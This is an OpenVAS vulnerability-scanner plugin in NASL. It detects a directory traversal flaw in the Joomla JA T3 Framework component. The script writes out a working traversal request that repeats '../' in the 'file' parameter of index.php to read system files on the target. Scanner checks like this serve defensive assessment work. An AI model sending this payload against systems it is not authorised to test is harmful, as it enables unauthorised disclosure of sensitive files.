##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_joomla_ja_t3_framework_com_dir_trav_vuln.nasl 10754 2018-08-03 10:38:29Z ckuersteiner $
#
# Joomla! JA T3 Framework Component Directory Traversal Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902672");
  script_version("$Revision: 10754 $");
  script_bugtraq_id(53039);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-08-03 12:38:29 +0200 (Fri, 03 Aug 2018) $");
  script_tag(name:"creation_date", value:"2012-04-25 17:38:13 +0530 (Wed, 25 Apr 2012)");

  script_name("Joomla! JA T3 Framework Component Directory Traversal Vulnerability");

  script_xref(name:"URL", value:"http://1337day.com/exploits/18065");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/74909");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/111906/Joomla-JA-T3-Framework-Directory-Traversal.html");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to read arbitrary files via
directory traversal attacks and gain sensitive information.");

  script_tag(name:"affected", value:"Joomla! JA T3 Framework Component");

  script_tag(name:"insight", value:"The flaw is due to an improper validation of user supplied input passed in
'file' parameter to the 'index.php', which allows attackers to read arbitrary files via a ../(dot dot)
sequences.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running Joomla! JA T3 Framework component and is prone to
directory traversal vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {
  url = dir + "/index.php?file=" + crap(data:"../",length:3*15) + files[file] + "&jat3action=gzip&type=css&v=1";

  if (http_vuln_check(port: port, url: url, pattern: file, check_header: TRUE)) {
    report = report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
